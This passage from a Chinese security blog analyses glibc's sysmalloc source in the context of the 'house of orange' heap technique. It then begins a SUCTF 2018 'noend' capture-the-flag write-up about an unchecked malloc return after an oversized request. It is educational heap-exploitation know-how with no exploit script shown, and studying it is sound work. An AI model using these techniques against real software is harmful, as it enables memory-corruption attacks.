class="line"></span><br><span class="line">  mchunkptr p;                    <span class="comment">/* the allocated/returned chunk */</span></span><br><span class="line">  mchunkptr remainder;            <span class="comment">/* remainder from allocation */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> remainder_size;   <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> pagesize = GLRO (dl_pagesize);</span><br><span class="line">  <span class="keyword">bool</span> tried_mmap = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If have mmap, and the request size meets the mmap threshold, and</span></span><br><span class="line"><span class="comment">     the system supports mmap, and there are few enough currently</span></span><br><span class="line"><span class="comment">     allocated mmapped regions, try to directly map this request</span></span><br><span class="line"><span class="comment">     rather than expanding top.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">      || ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (mp_.mmap_threshold)</span><br><span class="line">	  &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">  &#123;</span><br><span class="line">      ……</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p> av是当前的分配区，<code>mmap_threshold</code>是能够使用mmap分配的阈值，<code>n_mmaps_max</code>是mmap分配的内存块设定的最大值，调试查看这两个值：</p>
<p><img src="/2018/07/10/sysmalloc源码分析/mp_.png" alt="mp_结构体"></p>
<p>显然当前我们输入的0x2000不满足这个条件，执行下一个分支。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">old_top = av-&gt;top;</span><br><span class="line">old_size = chunksize (old_top);</span><br><span class="line">old_end = (<span class="keyword">char</span> *) (chunk_at_offset (old_top, old_size));</span><br><span class="line"></span><br><span class="line">brk = snd_brk = (<span class="keyword">char</span> *) (MORECORE_FAILURE);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If not the first time through, we require old_size to be</span></span><br><span class="line"><span class="comment">   at least MINSIZE and to have prev_inuse set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Precondition: not enough current space to satisfy nb request */</span></span><br><span class="line">assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE));</span><br></pre></td></tr></table></figure>
<p>接下来获取原来的top信息：起始地址、大小、终止地址。并且要求满足两个assert的条件：</p>
<ol>
<li>第一次调用<code>sysmalloc</code>函数，top还没有初始化；或者已经初始化，top的大小大于MINSIZE（0x10），表示前一个chunk处于inuse状态，以及top chunk的结束地址是页对齐的。</li>
<li>原top的大小小于当前要分配chunk的大小。</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">  &#123;</span><br><span class="line">    ……</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span>     <span class="comment">/* av == main_arena */</span></span><br><span class="line">  &#123; <span class="comment">/* Request enough space for nb + pad + overhead */</span></span><br><span class="line">    size = nb + mp_.top_pad + MINSIZE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       If contiguous, we can subtract out existing space that we hope to</span></span><br><span class="line"><span class="comment">       combine with new space. We add it back later only if</span></span><br><span class="line"><span class="comment">       we don't actually get contiguous space.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (contiguous (av))</span><br><span class="line">      size -= old_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       Round to a multiple of page size.</span></span><br><span class="line"><span class="comment">       If MORECORE is not contiguous, this ensures that we only call it</span></span><br><span class="line"><span class="comment">       with whole-page arguments.  And if MORECORE is contiguous and</span></span><br><span class="line"><span class="comment">       this is not first time through, this preserves page-alignment of</span></span><br><span class="line"><span class="comment">       previous calls. Otherwise, we correct to page-align below.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    size = ALIGN_UP (size, pagesize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">       Don't try to call MORECORE if argument is so big as to appear</span></span><br><span class="line"><span class="comment">       negative. Note that since mmap takes size_t arg, it may succeed</span></span><br><span class="line"><span class="comment">       below even if we cannot call MORECORE.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size &gt; <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        brk = (<span class="keyword">char</span> *) (MORECORE (size));</span><br><span class="line">        LIBC_PROBE (memory_sbrk_more, <span class="number">2</span>, brk, size);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
<p>之后是判断av是主分配区还是配主分配区，大部分大佬分析的都是非主分配区这部分，我这里就主要看主分配区了。先是重新计算需要分配的size。然后判断当前分配区是否连续，并将size按照页对齐。当size&gt;0时，通过<code>MORECORE</code>（<code>sbrk</code>）分配连续的内存。</p>
<p>contiguous函数定义为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NONCONTIGUOUS_BIT     (2U)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> contiguous(M)          (((M)-&gt;flags &amp; NONCONTIGUOUS_BIT) == 0)</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (brk != (<span class="keyword">char</span> *) (MORECORE_FAILURE))</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Call the `morecore' hook if necessary.  */</span></span><br><span class="line">          <span class="keyword">void</span> (*hook) (<span class="keyword">void</span>) = atomic_forced_read (__after_morecore_hook);</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">            (*hook)();</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">         ……</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>如果<code>sbrk</code>分配成功，并且<code>MORECORE</code>的hook函数存在，调用hook函数。（还不清楚hook用来干嘛）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (brk != (<span class="keyword">char</span> *) (MORECORE_FAILURE))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (mp_.sbrk_base == <span class="number">0</span>)</span><br><span class="line">          mp_.sbrk_base = brk;</span><br><span class="line">        av-&gt;system_mem += size;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">           If MORECORE extends previous space, we can likewise extend top size.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (brk == old_end &amp;&amp; snd_brk == (<span class="keyword">char</span> *) (MORECORE_FAILURE))</span><br><span class="line">          set_head (old_top, (size + old_size) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (contiguous (av) &amp;&amp; old_size &amp;&amp; brk &lt; old_end)</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="comment">/* Oops!  Someone else killed our space..  Can't touch anything.  */</span></span><br><span class="line">            malloc_printerr (<span class="number">3</span>, <span class="string">"break adjusted to free malloc space"</span>, brk,</span><br><span class="line">	       av);</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>
<p>如果<code>sbrk_base</code>还没有初始化，就根据brk修改<code>sbrk_base</code>的值。更新当前分配区的内存分配总量。</p>
<p>如果新的brk和旧的top结尾是同一地址，也就是说新分配的内存与原top是挨着的，就直接更新原top头中的大小和PREV_INUSE位，相当于直接扩大了top。</p>
<p>如果brk小于原top结尾，则出错。</p>
<p>而对于house of orange，由于我们修改了top大小，top_end也提前了，此时分配的brk和top_end不是同一地址，而是从未修改前的top结尾开始分配的内存，即以上两个条件都不满足，从而进入到下面的这个分支。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          front_misalign = <span class="number">0</span>;</span><br><span class="line">          end_misalign = <span class="number">0</span>;</span><br><span class="line">          correction = <span class="number">0</span>;</span><br><span class="line">          aligned_brk = brk;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* handle contiguous cases */</span></span><br><span class="line">          ……</span><br><span class="line">          <span class="comment">/* Adjust top based on results of second sbrk */</span></span><br><span class="line">          <span class="keyword">if</span> (snd_brk != (<span class="keyword">char</span> *) (MORECORE_FAILURE))</span><br><span class="line">            &#123;</span><br><span class="line">              av-&gt;top = (mchunkptr) aligned_brk;</span><br><span class="line">              set_head (av-&gt;top, (snd_brk - aligned_brk + correction) | PREV_INUSE);</span><br><span class="line">              av-&gt;system_mem += correction;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 If not the first time through, we either have a</span></span><br><span class="line"><span class="comment">                 gap due to foreign sbrk or a non-contiguous region.  Insert a</span></span><br><span class="line"><span class="comment">                 double fencepost at old_top to prevent consolidation with space</span></span><br><span class="line"><span class="comment">                 we don't own. These fenceposts are artificial chunks that are</span></span><br><span class="line"><span class="comment">                 marked as inuse and are in any case too small to use.  We need</span></span><br><span class="line"><span class="comment">                 two to make sizes and alignments work out.</span></span><br><span class="line"><span class="comment">               */</span></span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (old_size != <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     Shrink old_top to insert fenceposts, keeping size a</span></span><br><span class="line"><span class="comment">                     multiple of MALLOC_ALIGNMENT. We know there is at least</span></span><br><span class="line"><span class="comment">                     enough space in old_top to do this.</span></span><br><span class="line"><span class="comment">                   */</span></span><br><span class="line">                  old_size = (old_size - <span class="number">4</span> * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">                  set_head (old_top, old_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     Note that the following assignments completely overwrite</span></span><br><span class="line"><span class="comment">                     old_top when old_size was previously MINSIZE.  This is</span></span><br><span class="line"><span class="comment">                     intentional. We need the fencepost, even if old_top otherwise gets</span></span><br><span class="line"><span class="comment">                     lost.</span></span><br><span class="line"><span class="comment">                   */</span></span><br><span class="line">                  chunk_at_offset (old_top, old_size)-&gt;size =</span><br><span class="line">                    (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE;</span><br><span class="line"></span><br><span class="line">                  chunk_at_offset (old_top, old_size + <span class="number">2</span> * SIZE_SZ)-&gt;size =</span><br><span class="line">                    (<span class="number">2</span> * SIZE_SZ) | PREV_INUSE;</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/* If possible, release the rest. */</span></span><br><span class="line">                  <span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line">                    &#123;</span><br><span class="line">                      _int_free (av, old_top, <span class="number">1</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="comment">/* if (av !=  &amp;main_arena) */</span></span><br></pre></td></tr></table></figure>
<p>先有一些对齐操作，这里省略掉了，其中<code>aligned_brk</code>就是处理好之后的内存地址。</p>
<p>重新设置<code>av-&gt;top</code>的地址，为重新分配的<code>aligned_brk</code>，然后通过<code>set_head</code>设置top的大小和标志位，更新分配区的总分配内存量。</p>
<p>接着将top chunk切分为<code>fenceposts</code>和空闲块两部分，设置切分出空闲chunk大小为old_size。最终通过int_free释放掉old_top。</p>
<p>执行前后heap的大小比对：</p>
<p><img src="/2018/07/10/sysmalloc源码分析/h1.png" alt="原heap"></p>
<p><img src="/2018/07/10/sysmalloc源码分析/h2.png" alt="执行后的heap"></p>
<p>以及top地址的变化：</p>
<p><img src="/2018/07/10/sysmalloc源码分析/t1.png" alt="原top"></p>
<p><img src="/2018/07/10/sysmalloc源码分析/t2.png" alt="执行后的新top地址"></p>
<p>第二个malloc执行结束后，unsortedbin中存放的即为原来的top地址</p>
<p><img src="/2018/07/10/sysmalloc源码分析/ub.png" alt="unsorted bin"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://0gur1.cc/2018/07/09/suctf2018-noend/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="0gur1">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="0gur1">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/07/09/suctf2018-noend/" itemprop="url">suctf2018-noend</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-09T09:55:02+08:00">
                2018-07-09
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/07/09/suctf2018-noend/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2018/07/09/suctf2018-noend/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/07/09/suctf2018-noend/" class="leancloud_visitors" data-flag-title="suctf2018-noend">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  2,207字
                </span>
              

              

              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="基本逻辑"><a href="#基本逻辑" class="headerlink" title="基本逻辑"></a>基本逻辑</h2><p><img src="/2018/07/09/suctf2018-noend/main.png" alt="main函数"></p>
<p>函数逻辑比较简单，用户输入size，程序就分配size大小的chunk，接着用户向新分配的chunk内写入内容，程序在终端显示。当size小于等于0x7f时，就释放该chunk。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>乍一看，“咦，平时我们不都这么写吗”。实际上，在malloc之后要对返回值进行检查。如果malloc出错了，后续的操作很有可能超出我们的控制。</p>
<p>下面这个函数就是当调用malloc时执行的函数，它会首先获取一个分配区（<code>arena_get</code>），然后调用<code>_int_malloc</code>分配内存。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">//获取分配区</span></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">//分配内存</span></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="comment">//分配失败时，换到其他分配区内分配</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="keyword">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于noend程序中对输入的大小没有做限制，如果尝试输入一个很大的值，该值大于mmap分配的内存块设定的最大值（<code>n_mmaps_max</code>）,malloc在使用<code>_int_malloc</code>分配内存时，由于从fast bins，last remainder，small bins，large bins和top chunk都分配失败时，会调用<code>sysmalloc</code>函数，下面是对<code>sysmalloc</code>的简化。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (av == <span class="literal">NULL</span></span><br><span class="line">      || ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (mp_.mmap_threshold)</span><br><span class="line">	  &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))</span><br><span class="line">    &#123;</span><br><span class="line">   		<span class="comment">//由于输入的值已经大于n_mmaps_max，不会进入此处执行</span></span><br><span class="line">    	……</span><br><span class="line">	&#125;</span><br><span class="line">……</span><br><span class="line"><span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    &#123;</span><br><span class="line">    	<span class="comment">//考虑初始情况下都是在main_arena中进行分配，此处也不会执行</span></span><br><span class="line">    	……</span><br><span class="line">	&#125;</span><br><span class="line"> <span class="keyword">else</span>     <span class="comment">/* av == main_arena */</span></span><br><span class="line">    &#123; <span class="comment">/* Request enough space for nb + pad + overhead */</span></span><br><span class="line">      size = nb + mp_.top_pad + MINSIZE;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (contiguous (av))</span><br><span class="line">        size -= old_size;</span><br><span class="line">      </span><br><span class="line">      size = ALIGN_UP (size, pagesize);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (size &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">//sbrk（MORECORE）是通过将数据段的下界移动来分配连续内存，当size很大时，sbrk将会失败：MORECORE_FAILURE</span></span><br><span class="line">          brk = (<span class="keyword">char</span> *) (MORECORE (size));</span><br><span class="line">          LIBC_PROBE (memory_sbrk_more, <span class="number">2</span>, brk, size);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (brk != (<span class="keyword">char</span> *) (MORECORE_FAILURE))</span><br><span class="line">        &#123;</span><br><span class="line">          ……</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          </span><br><span class="line">          <span class="keyword">if</span> (contiguous (av))</span><br><span class="line">            size = ALIGN_UP (size + old_size, pagesize);</span><br><span class="line"></span><br><span class="line">       </span><br><span class="line">          <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (MMAP_AS_MORECORE_SIZE))</span><br><span class="line">            size = MMAP_AS_MORECORE_SIZE;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">//使用MMAP分配size大小的连续内存</span></span><br><span class="line">              <span class="keyword">char</span> *mbrk = (<span class="keyword">char</span> *) (MMAP (<span class="number">0</span>, size, PROT_READ | PROT_WRITE, <span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (mbrk != MAP_FAILED)</span><br><span class="line">                &#123;</span><br><span class="line">                 	……</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (brk != (<span class="keyword">char</span> *) (MORECORE_FAILURE))</span><br><span class="line">        &#123;</span><br><span class="line">          ……</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="comment">/* if (av !=  &amp;main_arena) */</span></span><br><span class="line"></span><br><span class="line">  ……</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* finally, do the allocation */</span></span><br><span class="line">  p = av-&gt;top;</span><br><span class="line">  size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//当前top大小为size，与申请分配的大小nb+MINSIZE比较</span></span><br><span class="line">  <span class="comment">/* check that one of the above allocation paths succeeded */</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">      ……</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* catch all failure paths */</span></span><br><span class="line">  __set_errno (ENOMEM);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>当试图申请一块巨大的内存时，sbrk和mmap都会失败，最终<code>_int_malloc</code>将会return 0。<code>__libc_malloc</code>对返回值进行判断，如果返回为0且分配区不为空时，就调用<code>arena_get_retry</code>重新获取一个新的分配区，并在新的分配区里分配内存。奇怪的是，如果此时<code>_int_malloc</code>又一次分配失败返回0，<code>__libc_malloc</code>也不会有其他操作了，直接返回0（assert是在debug模式下起作用的）。返回0之后，下面几句执行起来就会有问题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buf = <span class="built_in">malloc</span>(size);</span><br><span class="line">   read(<span class="number">0</span>, buf, size);</span><br><span class="line">   *((_BYTE *)buf + size - <span class="number">1</span>) = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
